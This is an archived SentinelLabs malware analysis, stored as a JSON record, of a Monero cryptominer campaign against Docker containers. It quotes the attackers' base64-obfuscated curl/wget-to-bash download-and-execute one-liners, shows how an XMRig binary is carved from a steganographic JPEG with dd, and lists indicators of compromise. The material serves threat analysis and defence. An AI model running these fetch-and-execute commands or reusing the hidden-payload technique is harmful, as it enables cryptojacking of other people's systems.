{
    "id": "597bf205-d6c9-4aa2-a172-6db8065cfdc3",
    "created_at": "2023-01-12T15:08:01.804635Z",
    "updated_at": "2025-03-27T02:05:53.94987Z",
    "deleted_at": null,
    "sha1_hash": "19d69cbe1bf8b15fefc2e8000aa9aab9fa3d4bdb",
    "title": "2021-05-20 - Caught in the Cloud - How a Monero Cryptominer Exploits Docker Containers",
    "authors": "",
    "file_creation_date": "2022-05-28T00:39:51Z",
    "file_modification_date": "2022-05-28T00:39:51Z",
    "file_size": 1588661,
    "plain_text": "# Caught in the Cloud | How a Monero Cryptominer Exploits Docker Containers\n\n**[labs.sentinelone.com/caught-in-the-cloud-how-a-monero-cryptominer-exploits-docker-containers/](https://labs.sentinelone.com/caught-in-the-cloud-how-a-monero-cryptominer-exploits-docker-containers/)**\n\nMarco Figueroa\n\n[Crypto currencies have become a focal point for cybercriminals, but by far the most popular](https://www.sentinelone.com/blog/malware-analyst-guide-bitcoin/)\ncryptocurrency to mine among cybercriminals over the last couple of years has been Monero\nvirtual currency (XMR). Over the last year, Monero is up 550% in value and cybercriminals\nare looking for long lasting Monero mining campaigns to gain huge profits.\n\nCryptomining malware flies under the radar because many of these unwanted programs do\nnot do anything obviously malicious to infected systems. However, the mining costs are\nabsorbed by the unknowing device owner while cybercriminals reap the rewards.\n\n[SentinelLabs recently detected a cryptocurrency mining campaign affecting Docker Linux](https://www.sentinelone.com/wp-content/uploads/)\nsystems. The Docker software platform has witnessed huge growth among enterprises due\nto its ability to push out applications in small, resource-frugal containers. This, combined with\nthe fact that many security solutions lack visibility into container images, makes them ideal\ntargets for low-risk, finance-driven campaigns.\n\nThe campaign seen by SentinelLabs doesn’t use notable exploit components but rather uses\na few simple obfuscation methods. The actors were clearly not expecting to find advanced\nendpoint protections on Docker containers. As we describe below, the miner calls a few\n\n`bash scripts and then uses` [steganography to evade legacy AVs or casual inspection.](https://www.sentinelone.com/blog/hiding-code-inside-images-malware-steganography/)\n\n\n-----\n\n## Technical Analysis\n\nOur [Vigilance team detected a Threat Actor (TA) who initially gained access to a Docker](https://assets.sentinelone.com/vdi1/sentinel-one-vigilan)\ncontainer. The initial sequence began with the threat actor executing a script.\n```\nsh -c echo 'aHR0cHM6Ly9pZGVvbmUuY29tL3BsYWluL2JIb0wyVwo='|base64 -d|(xargs curl -fsSL\n|| xargs wget -q -O)|bash\n\n```\nThis downloads a shell script from `hxxps//ideone[.]com/plain/bHoL2W .`\n\nThe second-stage downloaded from this URL is another simple shell script.\n```\n#!/bin/bash\na=$(base64 -d <<< \"aHR0cHM6Ly9pZGVvbmUuY29tL3BsYWluL0diN0JkMgo=\")\n(curl -fsSL $a||wget -q -O- $a)|bash\n\n```\nThe `a variable initially decodes the base64 formatted string`\n```\naHR0cHM6Ly9pZGVvbmUuY29tL3BsYWluL0diN0JkMgo, which converts to\nhttps://ideone[.]com/plain/Gb7Bd2 . The decoded URL is then passed to the curl\n\n```\ncommand, which uses `-f to fail silently so that there is no error output if there is a server`\nerror, `-sS to suppress the progress meter but still report an error if the entire command`\nfails, and `-L to ensure that redirects are followed. If the command fails using` `curl, the`\nscript switches to `wget, a similar command-line utility for downloading files from the web.`\nThe `-q switch tells` `wget to operate quietly so no output is sent and` `-O- to output the`\nfetched document to stdout. The output, whether from curl or wget, is then piped to `bash`\nfor immediate execution.\n\n\n-----\n\nThat output is a shell script with 174 lines of code. In the following section we will analyze the\nshell script.\n\n## From Shells to Mining\n\nThe first 16 lines of the script are plain text script commands, but on lines 17-19 there are\npatterns of base64 encoding. In line 17 it’s the same `base64 encoded string as described`\nin the previous section where the TA initially executed the script. Repeating this command\ntells me that the TA’s experience in writing malicious scripts is in the beginning stages of this\nTA’s journey, there are more elegant ways to do this.\n\nIn lines 18 and 19, the TA uses a clever trick to bypass detections by downloading a JPEG\nfile. Line 18’s `base64 decodes to` `https://i.ibb[.]co/6PdZ0NT/he.jpg and Line 19’s`\n```\nbase64 decodes to https://i.ibb[.]co/phwmnCb/he32.jpg .\n\n```\n\n-----\n\nThe first clue something was unusual was the size of the JPEG, which is 6MB. The first thing\n[is to analyze the jpg by loading it in Cerbero suite and confirm my theory that](https://www.sentinelone.com/wp-content/uploads/top-15-essential-malware-analysis-tools/) [steganography](https://www.sentinelone.com/blog/hiding-code-inside-images-malware-steganography/)\nis being used. Viewing the file contents, we can see that the JPEG file uses a JFIF header\nidentifier, but since I know this malware is intended to run on a Linux system I’m going to\nsearch for bytes `454c46 (the ELF magic number) that mark where an ELF binary begins.`\n\nTurning back to the shell script, let’s examine how the threat actor extracts and uses the ELF\nbinary found in the image.\n\nWe can see that the TA uses the `dd command-line utility, whose primary purpose is to`\nconvert and copy files. It copies the original JPEG file then outputs the file but skips the\nJPEG blocks on output with `skip=14497 and sets the output block size to Bytes` `bs=1 .`\n\n\n-----\n\nThe `if statement checks` `${ARCH}x = \"x86_64x\" then looks for` `${ARCH}x = \"i686x\",`\nwhich uses `he_32 and finally runs the command. The next line in the code makes it clear`\nthat we are dealing with XMRig.\n\nTo confirm, I ran the command\n\n```\ndd if=he_save_jpg of=he_save skip=14497 bs=1\n\n```\n\nand then loaded the `he_save into Ghidra. This showed that the ELF binary extracted from`\nthe image was XMRig 6.6.2, built on December 17 2020: one month before the shell scripts\nappeared in the wild.\n\n\n-----\n\n-----\n\n## Conclusion\n\nThe incidence of cryptominers in the enterprise has soared over the last few years as\nattackers seek low-risk returns from poorly-protected endpoints and cloud container\ninstances. Cryptocurrency mining malware hinders system performance, increases the\ncompute power cost to businesses, and in some cases can be a precursor of further\ninfections.\n\nDocker container protection is critical in fighting cryptomining due to the poor visibility in\nrunning container services. SentinelOne XDR detects the above malicious program and\nmany other cryptominer variants on cloud workloads as well as traditional endpoints.\n\n## Indicators of Compromise\n\n**SHA256**\n\n70144c33b1723087f4df98ca2c3aa39a6cc80a9dcee376562e2e65f07b020c9e\n\n5c21586e4fa48a5130d11e43ee332327e1bb76ad45b07d075a5ab350c7981c71\n\ne808760ffb94d970fb9a224c3e1093e5c8999dd736936d6290b28741abc9c81f\n\n**SHA1**\n\nc7bdffdeb5bee04c0effc6a7bfde64d4fef9e268\n\n423322dd42c5676d8770a94257d4008a57000129\n\nef1a8802b01d2b39017eb3717fa83cf9db5601a7\n\n**URLs**\n\nhxxps://ideone[.]com/plain/bHoL2W\n\nhxxps://ideone[.]com/plain/Gb7Bd2\n\nhxxps://i.ibb[.]co/6PdZ0NT/he.jpg\n\nhxxps://i.ibb[.]co/phwmnCb/he32.jpg\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-05-20 - Caught in the Cloud - How a Monero Cryptominer Exploits Docker Containers.pdf"
    ],
    "report_names": [
        "2021-05-20 - Caught in the Cloud - How a Monero Cryptominer Exploits Docker Containers.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673536081,
    "ts_updated_at": 1743041153,
    "ts_creation_date": 1653698391,
    "ts_modification_date": 1653698391,
    "files": {
        "pdf": "https://archive.orkl.eu/19d69cbe1bf8b15fefc2e8000aa9aab9fa3d4bdb.pdf",
        "text": "https://archive.orkl.eu/19d69cbe1bf8b15fefc2e8000aa9aab9fa3d4bdb.txt",
        "img": "https://archive.orkl.eu/19d69cbe1bf8b15fefc2e8000aa9aab9fa3d4bdb.jpg"
    }
}